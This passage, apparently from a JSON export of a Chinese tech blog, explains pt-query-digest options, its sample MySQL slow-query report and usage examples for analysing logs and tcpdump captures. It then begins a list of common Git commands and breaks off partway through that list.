style=\"font-size:16px;\">pt-query-<span style=\"margin:0px;padding:0px;line-height:1.5;\">digest [OPTIONS] [FILES] [DSN]\n</span>--create-review-table  当使用--<span style=\"margin:0px;padding:0px;line-height:1.5;\">review参数把分析结果输出到表中时，如果没有表就自动创建。\n</span>--create-history-table  当使用--<span style=\"margin:0px;padding:0px;line-height:1.5;\">history参数把分析结果输出到表中时，如果没有表就自动创建。\n</span>--<span style=\"margin:0px;padding:0px;line-height:1.5;\">filter  对输入的慢查询按指定的字符串进行匹配过滤后再进行分析\n</span>--limit    限制输出结果百分比或数量，默认值是20,即将最慢的20条语句输出，如果是50%则按总响应时间占比从大到小排序，输出到总和达到50%<span style=\"margin:0px;padding:0px;line-height:1.5;\">位置截止。\n</span>--<span style=\"margin:0px;padding:0px;line-height:1.5;\">host  mysql服务器地址\n</span>--<span style=\"margin:0px;padding:0px;line-height:1.5;\">user  mysql用户名\n</span>--<span style=\"margin:0px;padding:0px;line-height:1.5;\">password  mysql用户密码\n</span>--history 将分析结果保存到表中，分析结果比较详细，下次再使用--<span style=\"margin:0px;padding:0px;line-height:1.5;\">history时，如果存在相同的语句，且查询所在的时间区间和历史表中的不同，则会记录到数据表中，可以通过查询同一CHECKSUM来比较某类型查询的历史变化。\n</span>--review 将分析结果保存到表中，这个分析只是对查询条件进行参数化，一个类型的查询一条记录，比较简单。当下次使用--<span style=\"margin:0px;padding:0px;line-height:1.5;\">review时，如果存在相同的语句分析，就不会记录到数据表中。\n</span>--output 分析结果输出类型，值可以是report(标准分析报告)、slowlog(Mysql slow log)、json、json-<span style=\"margin:0px;padding:0px;line-height:1.5;\">anon，一般使用report，以便于阅读。\n</span>--since 从什么时间开始分析，值为字符串，可以是指定的某个”yyyy-mm-<span style=\"margin:0px;padding:0px;line-height:1.5;\">dd [hh:mm:ss]”格式的时间点，也可以是简单的一个时间值：s(秒)、h(小时)、m(分钟)、d(天)，如12h就表示从12小时前开始统计。\n</span>--until 截止时间，配合—since可以分析一段时间内的慢查询。</span></pre></div><h3 style=\"margin-top:10px;margin-bottom:10px;padding:0px;line-height:1.5;\"><span style=\"font-size:18px;\">四、分析pt-query-digest输出结果</span></h3><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">第一部分：总体统计结果<br style=\"margin:0px;padding:0px;\">Overall：总共有多少条查询<br style=\"margin:0px;padding:0px;\">Time range：查询执行的时间范围<br style=\"margin:0px;padding:0px;\">unique：唯一查询数量，即对查询条件进行参数化以后，总共有多少个不同的查询<br style=\"margin:0px;padding:0px;\">total：总计   min：最小   max：最大  avg：平均<br style=\"margin:0px;padding:0px;\">95%：把所有值从小到大排列，位置位于95%的那个数，这个数一般最具有参考价值<br style=\"margin:0px;padding:0px;\">median：中位数，把所有值从小到大排列，位置位于中间那个数</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\"># 该工具执行日志分析的用户时间，系统时间，物理内存占用大小，虚拟内存占用大小\n# 340ms user time, 140ms system time, </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">23.99M</span> rss, <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">203.11M</span><span style=\"margin:0px;padding:0px;line-height:1.5;\"> vsz\n# 工具执行时间\n# Current date: Fri Nov </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">25</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">02</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">37</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">18</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2016</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# 运行分析工具的主机名\n# Hostname: localhost.localdomain\n# 被分析的文件名\n# Files: slow.log\n# 语句总数量，唯一的语句数量，QPS，并发数\n# Overall: </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2</span> total, <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2</span> unique, <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0.01</span> QPS, <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">.01x concurrency ________________\n# 日志记录的时间范围\n# Time range: </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2016</span>-<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">11</span>-<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">22</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">06</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">06</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">18</span> to <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">06</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">11</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">40</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# 属性               总计      最小    最大    平均    </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">95</span>%<span style=\"margin:0px;padding:0px;line-height:1.5;\">  标准    中等\n# Attribute          total     min     max     avg     </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">95</span>%<span style=\"margin:0px;padding:0px;line-height:1.5;\">  stddev  median\n# </span>============     ======= ======= ======= ======= ======= ======= =======<span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# 语句执行时间\n# Exec time             3s   640ms      2s      1s      2s   999ms      1s\n# 锁占用时间\n# Lock time            1ms       </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">     1ms   723us     1ms     1ms   723us\n# 发送到客户端的行数\n# Rows sent              </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">5</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">4</span>    <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2.50</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">4</span>    <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2.12</span>    <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2.50</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# select语句扫描行数\n# Rows examine     </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">186</span>.17k       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">186</span>.17k  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">93</span>.09k <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">186</span>.17k <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">131</span>.64k  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">93</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">.09k\n# 查询的字符数\n# Query size           </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">455</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span>     <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">440</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">227.50</span>     <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">440</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">300.52</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">227.50</span></span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">第二部分：查询分组统计结果<br style=\"margin:0px;padding:0px;\">Rank：所有语句的排名，默认按查询时间降序排列，通过--order-by指定<br style=\"margin:0px;padding:0px;\">Query ID：语句的ID，（去掉多余空格和文本字符，计算hash值）<br style=\"margin:0px;padding:0px;\">Response：总的响应时间<br style=\"margin:0px;padding:0px;\">time：该查询在本次分析中总的时间占比<br style=\"margin:0px;padding:0px;\">calls：执行次数，即本次分析总共有多少条这种类型的查询语句<br style=\"margin:0px;padding:0px;\">R/Call：平均每次执行的响应时间<br style=\"margin:0px;padding:0px;\">V/M：响应时间Variance-to-mean的比率<br style=\"margin:0px;padding:0px;\">Item：查询对象</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\"># Profile\n# Rank Query ID           Response time Calls R</span>/Call V/<span style=\"margin:0px;padding:0px;line-height:1.5;\">M   Item\n# </span>==== ================== ============= ===== ====== ===== ===============<span style=\"margin:0px;padding:0px;line-height:1.5;\">\n#    </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0xF9A57DD5A41825CA</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2.0529</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">76.2</span>%     <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2.0529</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0.00</span><span style=\"margin:0px;padding:0px;line-height:1.5;\"> SELECT\n#    </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0x4194D8F83F4F9365</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0.6401</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">23.8</span>%     <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0.6401</span>  <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0.00</span> SELECT wx_member_base</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">第三部分：每一种查询的详细统计结果<br style=\"margin:0px;padding:0px;\">由下面查询的详细统计结果，最上面的表格列出了执行次数、最大、最小、平均、95%等各项目的统计。<br style=\"margin:0px;padding:0px;\">ID：查询的ID号，和上图的Query ID对应<br style=\"margin:0px;padding:0px;\">Databases：数据库名<br style=\"margin:0px;padding:0px;\">Users：各个用户执行的次数（占比）<br style=\"margin:0px;padding:0px;\">Query_time distribution ：查询时间分布, 长短体现区间占比，本例中1s-10s之间查询数量是10s以上的两倍。<br style=\"margin:0px;padding:0px;\">Tables：查询中涉及到的表<br style=\"margin:0px;padding:0px;\">Explain：SQL语句</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\"># Query <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>: <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span> QPS, 0x concurrency, ID <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0xF9A57DD5A41825CA</span> at <span style=\"margin:0px;padding:0px;color:rgb(0,0,255);line-height:1.5;\">byte</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">802</span><span style=\"margin:0px;padding:0px;line-height:1.5;\"> ______\n# This item </span><span style=\"margin:0px;padding:0px;color:rgb(0,0,255);line-height:1.5;\">is</span> included <span style=\"margin:0px;padding:0px;color:rgb(0,0,255);line-height:1.5;\">in</span> the report because it matches --<span style=\"margin:0px;padding:0px;line-height:1.5;\">limit.\n# Scores: V</span>/M = <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0.00</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Time range: all events occurred at </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2016</span>-<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">11</span>-<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">22</span> <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">06</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">11</span>:<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">40</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Attribute    pct   total     min     max     avg     </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">95</span>%<span style=\"margin:0px;padding:0px;line-height:1.5;\">  stddev  median\n# </span>============ === ======= ======= ======= ======= ======= ======= =======<span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Count         </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">50</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Exec time     </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">76</span>      2s      2s      2s      2s      2s       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">      2s\n# Lock time      </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Rows sent     </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">20</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Rows examine   </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Query size     </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">3</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span>       <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">0</span>      <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">15</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# String:\n# Databases    test\n# Hosts        </span><span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">192.168</span>.<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">8.1</span><span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# Users        mysql\n# Query_time distribution\n#   1us\n#  10us\n# 100us\n#   1ms\n#  10ms\n# 100ms\n#    1s  ################################################################\n#  10s</span>+<span style=\"margin:0px;padding:0px;line-height:1.5;\">\n# EXPLAIN </span><span style=\"margin:0px;padding:0px;color:rgb(0,128,0);line-height:1.5;\">/*</span><span style=\"margin:0px;padding:0px;color:rgb(0,128,0);line-height:1.5;\">!50100 PARTITIONS</span><span style=\"margin:0px;padding:0px;color:rgb(0,128,0);line-height:1.5;\">*/</span>\n<span style=\"margin:0px;padding:0px;color:rgb(0,0,255);line-height:1.5;\">select</span> sleep(<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">2</span>)\\G</span></pre></div><h3 style=\"margin-top:10px;margin-bottom:10px;padding:0px;line-height:1.5;\"><span style=\"font-size:18px;\">五、用法示例</span></h3><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">1.直接分析慢查询文件:</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest  slow.log &gt; slow_report.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">2.分析最近12小时内的查询：</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest  --since=12h  slow.log &gt; slow_report2.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">3.分析指定时间范围内的查询：</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest slow.log --since <span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">2017-01-07 09:30:00</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span> --until <span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\">2017-01-07</span> 10:00:00</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span>&gt; &gt; slow_report3.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">4.分析指含有select语句的慢查询</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest --filter <span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">$event-&gt;{fingerprint} =~ m/^select/i</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span> slow.log&gt; slow_report4.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">5.针对某个用户的慢查询</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest --filter <span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">($event-&gt;{user} || \"\") =~ m/^root/i</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span> slow.log&gt; slow_report5.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">6.查询所有所有的全表扫描或full join的慢查询</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest --filter <span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">(($event-&gt;{Full_scan} || \"\") eq \"yes\") ||(($event-&gt;{Full_join} || \"\") eq \"yes\")</span><span style=\"margin:0px;padding:0px;color:rgb(128,0,0);line-height:1.5;\">'</span> slow.log&gt; slow_report6.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">7.把查询保存到query_review表</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest --user=root –password=abc123 --review  h=localhost,D=test,t=query_review--create-review-table  slow.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">8.把查询保存到query_history表</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest  --user=root –password=abc123 --review  h=localhost,D=test,t=query_history--create-review-<span style=\"margin:0px;padding:0px;line-height:1.5;\">table  slow.log_0001\npt</span>-query-digest  --user=root –password=abc123 --review  h=localhost,D=test,t=query_history--create-review-table  slow.log_0002</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">9.通过tcpdump抓取mysql的tcp协议数据，然后再分析</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">tcpdump -s <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">65535</span> -x -nn -q -tttt -i any -c <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">1000</span> port <span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">3306</span> &gt;<span style=\"margin:0px;padding:0px;line-height:1.5;\"> mysql.tcp.txt\npt</span>-query-digest --type tcpdump mysql.tcp.txt&gt; slow_report9.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">10.分析binlog</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">mysqlbinlog mysql-bin.<span style=\"margin:0px;padding:0px;color:rgb(128,0,128);line-height:1.5;\">000093</span> &gt; mysql-<span style=\"margin:0px;padding:0px;line-height:1.5;\">bin000093.sql\npt</span>-query-digest  --type=binlog  mysql-bin000093.sql &gt; slow_report10.log</span></pre></div><p style=\"margin:10px auto;\"><span style=\"font-size:16px;\">11.分析general log</span></p><div class=\"cnblogs_code\" style=\"margin:5px 0px;padding:5px;background-color:rgb(245,245,245);border:1px solid rgb(204,204,204);font-family:'Courier New';\"><pre style=\"margin-bottom:0px;padding-right:0px;padding-left:0px;white-space:pre-wrap;font-family:'Courier New';\"><span style=\"font-size:16px;\">pt-query-digest  --type=genlog  localhost.log &gt; slow_report11.log</span></pre></div><p style=\"margin:10px auto;\"><br><span style=\"font-size:16px;\">转载原文:<a href=\"https://www.cnblogs.com/luyucheng/p/6265873.html\" rel=\"nofollow\">https://www.cnblogs.com/luyucheng/p/6265873.html</a></span></p></div></div></div></div></div><div class=\"commentform\" style=\"margin:0px;padding:0px;\"><span style=\"color:rgb(0,0,0);font-family:'Helvetica Neue', Helvetica, Verdana, Arial, sans-serif;font-size:12px;text-align:left;background-color:rgb(255,255,255);\"></span><div style=\"margin:0px;padding:0px;color:rgb(0,0,0);font-family:'Helvetica Neue', Helvetica, Verdana, Arial, sans-serif;font-size:12px;text-align:left;background-color:rgb(255,255,255);\"></div></div>                                    </div>", "log_PostTime": 1584891065, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Git常用命令", "log_Intro": "Git常用命令", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>查看、添加、提交、删除、找回，重置修改文件</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git help &lt;command&gt; # 显示command的help</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git show # 显示某次提交的内容 git show $id</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co -- &lt;file&gt; # 抛弃工作区修改</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co . # 抛弃工作区修改</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git add &lt;file&gt; # 将工作文件修改提交到本地暂存区</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git add . # 将所有修改过的工作文件提交暂存区</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git rm &lt;file&gt; # 从版本库中删除文件</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git reset &lt;file&gt; # 从暂存区恢复到工作文件</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git reset -- . # 从暂存区恢复到工作文件</span></p><p style=\"margin:10px 